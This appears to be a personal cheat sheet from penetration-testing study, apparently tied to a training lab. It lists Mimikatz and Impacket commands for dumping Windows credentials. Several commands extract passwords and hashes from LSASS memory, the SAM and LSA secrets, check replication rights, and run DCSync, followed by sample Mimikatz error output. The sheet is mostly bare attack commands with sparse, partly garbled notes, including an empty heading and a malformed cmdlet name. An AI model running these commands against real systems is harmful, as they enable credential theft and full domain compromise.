

abuse for sedebug (gain system)
```
token::elevate
```


`AD Credentails for logged-on users`, stored in memmory
```
sekurlsa::logonpasswords
```
- `sekurlsa` = dump credentials from LSASS memory (logged-in/cached users).
- `lsadump::sam` this is for `local accounts` = dump full SAM hashes from disk (requires SYSTEM).
**`lsadump::lsa`** `dumps lsa secrets: dpapi, vpn creds`

`switch to mini dump mode and supply dmp file`:
```cmd-session
sekurlsa::minidump lsass.dmp
```

`dump memmory`:
```cmd-session
 # sekurlsa::logonpasswords
```

`::msv`
### for Extracting Kerberos Tickets

##  for DCsync 
`requires sereplication privilege, check for that acl type`
```
$SID = Convert-Name-TO-SID <name>
get-domainobjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $SID}
```

#dcsyncing
```
./mimikatz.exe

# lsadump::dcsync /domain:{} /user:{domain\targetuser} 

```

# dcsync linux
```
 secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/tpetty@172.16.6.3
```

### common issues
1. you dont have sufficient privileges
```
mimikatz # lsadump::sam
Domain : WINLPE-SRV01
SysKey : e64931232d19f5290583852df985915c
ERROR kull_m_registry_OpenAndQueryWithAlloc ; kull_m_registry_RegOpenKeyEx KO
ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)

mimikatz # lsadump::lsa
ERROR kuhl_m_lsadump_lsa ; SamConnect c0000022

mimikatz # lsadump::sam
Domain : WINLPE-SRV01
SysKey : e64931232d19f5290583852df985915c
ERROR kull_m_registry_OpenAndQueryWithAlloc ; kull_m_registry_RegOpenKeyEx KO
ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)

mimikatz # lsadump::secrets
Domain : WINLPE-SRV01
SysKey : e64931232d19f5290583852df985915c
ERROR kuhl_m_lsadump_secretsOrCache ; kull_m_registry_RegOpenKeyEx (SECURITY) (0x00000005)
```